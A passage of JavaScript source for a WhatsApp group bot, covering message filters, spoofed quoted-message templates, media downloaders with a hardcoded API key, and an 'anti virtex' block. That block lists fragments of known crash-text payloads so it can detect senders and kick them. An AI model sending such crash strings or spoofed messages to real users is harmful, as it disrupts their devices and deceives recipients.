			Yuta.sendMessage(m.chat, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }

async function addCountCmd(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.data.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

async function sendReact(teks, key = m.key) { 
  Yuta.sendMessage(m.chat, {react: {text: teks, key: key}})
}


const resize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}

//=================================================//

const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg') } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6285892928715:6285892928715\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
		const fnews = { key:{ remoteJid: 'status@broadcast', participant: '0@s.whatsapp.net' }, message:{ newsletterAdminInviteMessage: { newsletterJid: 'nd@newsletter', newsletterName: 'Tes', caption: `${budy}`, inviteExpiration: 0}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}	
	    
let list = []
for (let i of owner) {
list.push({
displayName: await Yuta.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await Yuta.getName(i + '@s.whatsapp.net')}\n
FN:${await Yuta.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Tt: @DitzSenpai\n
item2.X-ABLabel:Email\n
item3.URL:Youtube : Ditz\n
item3.X-ABLabel:Grup WangSaff\n
item4.ADR:;;Mars Area 51;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}


async function LoadingReact () {
var react = [
  "⏳",
  "✅"
];
for (let i = 0; i < react.length; i++) {
await new Promise(resolve => setTimeout(resolve, 10));
await Yuta.sendMessage(m.chat, {
react: {
text: react[i],
key: m.key
}
})
}}


async function twiterdl(id) {
    try {
        const url = 'https://ssstwitter.com';
        const response = await axios.get(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36'
            }
        });

        const $ = cheerio.load(response.data);
        const form = $('form.pure-form.pure-g.hide-after-request');
        const includeVals = form.attr('include-vals');
        const ttMatch = includeVals.match(/tt:'([^']+)'/);
        const tsMatch = includeVals.match(/ts:(\d+)/);

        if (!ttMatch || !tsMatch) throw new Error('Cannot find tt or ts values.');

        const tt = ttMatch[1];
        const ts = tsMatch[1];

        const postData = new URLSearchParams({
            tt: tt,
            ts: ts,
            source: 'form',
            id: id,
            locale: 'en'
        });

        const postResponse = await axios.post(url, postData.toString(), {
            headers: {
                'HX-Request': 'true',
                'HX-Target': 'target',
                'HX-Current-URL': 'https://ssstwitter.com/en',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
                'Referer': 'https://ssstwitter.com/result_normal'
            }
        });

        const $result = cheerio.load(postResponse.data);
        const downloads = [];
        $result('.result_overlay a.download_link').each((i, element) => {
            const text = $(element).text().trim();
            const url = $(element).attr('href');
            if (url) {
                downloads.push({ text, url });
            }
        });

        const data = {
            title: $result('.result_overlay h2').text().trim(),
            downloads: downloads
        };

        return {status: true, data};
    } catch (error) {
        console.error('Error:', error);
        throw error;
    }
}

Yuta.autoshalat = Yuta.autoshalat ? Yuta.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? Yuta.user.id : m.sender
let id = m.chat 
if (id in Yuta.autoshalat) {
    return false
}
let jadwalSholat = {
    shubuh: '04:39',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
}
const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }))
const hours = datek.getHours()
const minutes = datek.getMinutes()
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
if (timeNow === waktu) {
Yuta.autoshalat[id] = [
Yuta.sendMessage(m.chat, {
audio: {
url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
mediaType: 1,
mediaUrl: '',
title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
body: `🕑 ${waktu}`,
sourceUrl: '',
thumbnail: await fs.readFileSync('./YutaMedia/theme/jdw.png'),
renderLargerThumbnail: true
}
}
}, {
quoted: m,
mentions: participants.map(a => a.id)
}),
setTimeout(async () => {
delete Yuta.autoshalat[m.chat]
}, 57000)
]
}
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 15;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

async function IsReg() {
let cap = "*[ sʏsᴛᴇᴍ ]* ᴍᴀᴀғ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴅᴀғᴛᴀʀ sɪʟᴀᴋᴀɴ ᴅᴀғᴛᴀʀ .ᴅᴀғᴛᴀʀ ɴᴀᴍᴀ.ᴜᴍᴜʀ"
let buttonnya = [
 {
name: 'quick_reply',
buttonParamsJson: {
display_text: 'Auto Register',
id: `.daftar ${pushname}.17`}
}]
await Yuta.sendButtonImgdf(m.chat, cap, botname, null, fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'), buttonnya, fnews, saluran, `Register By; ${ownername}`);
}

const downloadMp3 = async (Link) => {
const vidId = ytdl.getURLVideoID(Link)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

try {
sendReaction('⏳');
const { yt } = require('./lib/saversevall')
let h = new yt()
let hasil = await h.download(Link)
sendReaction('✅');
let get = hasil.data
let leo = {
    audio: {
      url: hasil.mp3.url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
const { youtube } = require('./lib/y2mate-kavian')
sendReaction('⏳');
let hasil = await youtube(Link)
let get = hasil.download
let result = await(await(get.dl.mp3['mp3']())).url
let leo = {
    audio: {
    url:result
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
sendReaction('✅');
} catch (err) {
try {
sendReaction('⏳');
let lenwy = await fetchJson(`https://api-lenwy.vercel.app/mp3?url=${Link}`)
sendReaction('✅');
let leo = {
    audio: {
      url: lenwy.data.download_url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
sendReaction('⏳');
const { dlall } = require('./lib/y2mate')
let { audio, video } = await dlall(Link)
sendReaction('✅');
let leo = {
    audio: {
      url: audio['128'].url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
sendReaction('⏳');
const { RetaTube } = require('./lib/Ytdlaio')
sendReaction('✅');
let g = new RetaTube()
let hasil = await g.scrape(Link)
let leo = {
    audio: {
      url: hasil.downloadLinks[0].url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail,
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
sendReaction('⏳');
let gett = await(await fetch(`https://rest.cifumo.biz.id/api/downloader/ytdl?url=${Link}`)).json()
sendReaction('✅');
let get = gett.data
let leo = {
    audio: {
      url: get.audio
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
sendReaction('⏳');
let Widipe = await(await fetch(`https://widipe.com/download/ytdl?url=${Link}`)).json()
sendReaction('✅');
let get = Widipe.result
let leo = {
    audio: {
      url: get.mp3
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
sendReaction('⏳');
let { result } = await(await fetch(`https://api.botwa.space/api/ytmp3?url=${Link}&apikey=90x5sFRa1Xlc`)).json()
sendReaction('✅');
let get = result.media['320kbps']
let leo = {
    audio: {
      url: get.url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
} catch (err) {
try {
sendReaction('⏳');
let { result } = await ytMp3(Link)
sendReaction('✅');
let leo = {
    audio: {
      url: result
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
sendReaction('⏳');
let result = await ytdlnode.mp3(Link)
sendReaction('✅');
let leo = {
    audio: {
      url: result.media['128kbps'].url
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
try {
const { topcc } = require('./lib/topcc')
sendReaction('⏳');
let { conversions } = await topcc(Link)
sendReaction('✅');
let leo = {
    audio: {
      url: conversions[11].downloadLink
    },
    mimetype:'audio/mpeg',
    contextInfo: {
      externalAdReply: {
        showAdAttribution: true,
        mediaType: 2,
        mediaUrl: convert.url,
        title: convert.title,
        body: convert.author.name,
        sourceUrl: convert.url,
        thumbnailUrl: convert.thumbnail
      }
    }
  };
 await Yuta.sendMessage(m.chat, leo, { quoted: fnews });
 } catch (err) {
 sendReaction('❌');
}}}}}}}}
}}}}

const downloadMp4 = async (Link) => {
const vidId = ytdl.getURLVideoID(Link)
let getresult = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })
let convert = getresult

let captions = `〆 ᴊᴜᴅᴜʟ : ${convert.title}\n`
captions += `〆 ᴅᴜʀᴀᴛɪᴏɴ : ${convert.timestamp}\n`
captions += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${convert.views}\n`
captions += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${convert.ago}\n`
captions += `〆 ᴀᴜᴛʜᴏʀ : ${convert.author.name}\n`
captions += `〆 ᴅᴇ𝘴ᴄʀɪᴘᴛɪᴏɴ : ${convert.description}\n`
captions += `〆 ᴜʀʟ : ${convert.url}`

try {
sendReaction('⏳');
const { yt } = require('./lib/saversevall')
let h = new yt()
let hasil = await h.download(Link)
sendReaction('✅');
await Yuta.sendMessage(m.chat,{video:{url: hasil.mp4.url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
const { youtube } = require('./lib/y2mate-kavian')
let hasil = await youtube(Link)
let get = hasil.download.dl
let result = await(await(get.mp4['360p']())).url
await Yuta.sendMessage(m.chat,{video:{url: result }, caption: captions },{quoted: fnews})
sendReaction('✅');
} catch (err) {
try {
sendReaction('⏳');
let lenwy = await fetchJson(`https://api-lenwy.vercel.app/mp4?url=${Link}`)
sendReaction('✅');
await Yuta.sendMessage(m.chat,{video:{url: lenwy.data.download_url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
const { dlall } = require('./lib/y2mate')
sendReaction('✅');
let { audio, video } = await dlall(Link)
await Yuta.sendMessage(m.chat,{video:{url: video['1080'].url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
const { RetaTube } = require('./lib/Ytdlaio')
sendReaction('✅');
let g = new RetaTube()
let hasil = await g.scrape(Link)
await Yuta.sendMessage(m.chat,{video:{url: hasil.downloadLinks[0].url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
let gett = await(await fetch(`https://rest.cifumo.biz.id/api/downloader/ytdl?url=${Link}`)).json()
sendReaction('✅');
let get = gett.data
await Yuta.sendMessage(m.chat,{video:{url: get.video }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
let { result } = await(await fetch(`https://api.botwa.space/api/ytmp4?url=${Link}&apikey=90x5sFRa1Xlc`)).json()
sendReaction('✅');
let get = result.media['360p']
await Yuta.sendMessage(m.chat,{video:{url: get.url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
let { result } = await ytMp4(Link)
sendReaction('✅');
await Yuta.sendMessage(m.chat,{video:{url: result }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
let result = await ytdlnode.mp4(Link)
sendReaction('✅');
console.log(result)
await Yuta.sendMessage(m.chat,{video:{url: result.media['720p'].url }, caption: captions },{quoted: fnews})
} catch (err) {
try {
sendReaction('⏳');
const { topcc } = require('./lib/topcc')
let { conversions } = await topcc(Link)
sendReaction('✅');
await Yuta.sendMessage(m.chat,{video:{url: conversions[4].downloadLink }, caption: captions },{quoted: fnews})
} catch (err) {
sendReaction('❌');
}}}}}}
}}}}}

//ANTI VIRUS
if (m.isGroup && db.data.groups[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isBotAdmin) return replygcyuta('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Yuta.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!m.isBotAdmin) return
if(YutaTheCreator) return
Yuta.groupParticipantsUpdate(m.chat, [sender], 'remove')
await Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
Yuta.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
    
    //anti media
        if (db.data.groups[m.chat].antimedia && isMedia) {
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.groups[m.chat].image && isYutaMedia) {
    if(isYutaMedia === "imageMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.groups[m.chat].antivideo && isYutaMedia) {
    if(isYutaMedia === "videoMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.groups[m.chat].antisticker && isYutaMedia) {
    if(isYutaMedia === "stickerMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.groups[m.chat].antiaudio && isYutaMedia) {
    if(isYutaMedia === "audioMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.groups[m.chat].antipoll && isYutaMedia) {
    if(isYutaMedia === "pollCreationMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.groups[m.chat].antilocation && isYutaMedia) {
    if(isYutaMedia === "locationMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.groups[m.chat].antidocument && isYutaMedia) {
    if(isYutaMedia === "documentMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.groups[m.chat].anticontact && isYutaMedia) {
    if(isYutaMedia === "contactMessage"){
        if (YutaTheCreator || isAdmin || !isBotAdmin){		  
        } else {
          replygcyuta(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return Yuta.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
  
        if (db.data.groups[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmin) return replygcyuta(bvl)
if (m.key.fromMe) return replygcyuta(bvl)
if (YutaTheCreator) return replygcyuta(bvl)
               await Yuta.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Yuta.sendMessage(m.chat, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        
        if (SimiActive) {
 const languageCode = 'id';
 const simsimiKey = ''; 
 fetch('https://api.simsimi.vn/v1/simtalk', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 body: `text=hm ${encodeURIComponent(text)}&lc=${languageCode}&key=${simsimiKey}`
 })
 .then(response => response.json())//wm senn
 .then(data => {
 const simsimiResponse = data.message;
 const replyText = `${simsimiResponse}`;
 Yuta.sendMessage(m.chat, { text: replyText }, { quoted: m });//wm senn
 })
